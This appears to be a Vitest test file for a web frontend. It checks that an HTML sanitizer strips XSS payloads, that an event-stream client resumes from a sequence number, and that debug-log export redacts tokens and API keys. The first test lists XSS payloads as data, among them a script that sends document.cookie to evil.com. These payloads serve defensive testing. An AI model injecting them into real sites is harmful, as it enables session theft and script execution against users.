// tests/ui/frontend-suite.test.ts
import { describe, it, expect } from "vitest";
import { AIRPEventSourceClient } from "../../src/ui/sse-client.js";
import { exportSanitizedDebugLog } from "../../src/ui/log-exporter.js";
import { sanitizeHtml } from "../../src/ui/sanitize.js";
import { RuntimeEvent } from "../../src/runtime/contracts.js";

describe("Stage 4 Frontend Quality & Security Test Suite", () => {
  it("1. XSS 防御隔离：确保 Markdown/HTML 注入攻击被彻底剔除", () => {
    const payloads = [
      "<script>fetch('http://evil.com?c='+document.cookie)</script>",
      "<img src=x onerror=alert(1)>",
      "<iframe src=\"javascript:alert('xss')\"></iframe>",
      "<a href=\"javascript:void(0)\" onclick=\"alert(1)\">点击</a>",
    ];

    for (const payload of payloads) {
      const sanitized = sanitizeHtml(payload);
      expect(sanitized).not.toContain("<script");
      expect(sanitized).not.toContain("onerror");
      expect(sanitized).not.toContain("<iframe");
      expect(sanitized).not.toContain("javascript:");
    }
  });

  it("2. 断线重连与 seq 续传断言：确保客户端按 fromSeq 续订", () => {
    let requestedUrl = "";
    const mockGlobal = globalThis as unknown as {
      EventSource: new (url: string) => { onmessage: unknown; onerror: unknown; close: () => void };
    };

    const originalEventSource = mockGlobal.EventSource;

    mockGlobal.EventSource = class MockEventSource {
      onmessage: unknown = null;
      onerror: unknown = null;
      constructor(url: string) {
        requestedUrl = url;
      }
      close() {}
    };

    try {
      const client = new AIRPEventSourceClient({
        url: "http://127.0.0.1:8080/api/runs/r1/events",
        token: "test-token",
        fromSeq: 42,
        onEvent: () => {},
      });

      client.connect();

      expect(requestedUrl).toContain("from=42");
      expect(requestedUrl).toContain("token=test-token");
      client.close();
    } finally {
      mockGlobal.EventSource = originalEventSource;
    }
  });

  it("3. 调试日志脱敏导出格式合规", () => {
    const sampleInput = {
      cardId: "card_sample",
      sessionId: "sess_sample",
      runtimeConfig: {
        token: "token=abc123secret",
        apiKey: "sk-proj-super-secret-key-12345",
      },
      events: [
        { seq: 1, type: "floor_appended", text: "正常文本" } as unknown as RuntimeEvent,
      ],
    };

    const jsonText = exportSanitizedDebugLog(sampleInput);
    const parsed = JSON.parse(jsonText);

    expect(parsed.cardId).toBe("card_sample");
    expect(jsonText).not.toContain("abc123secret");
    expect(jsonText).not.toContain("sk-proj-super-secret-key-12345");
  });
});
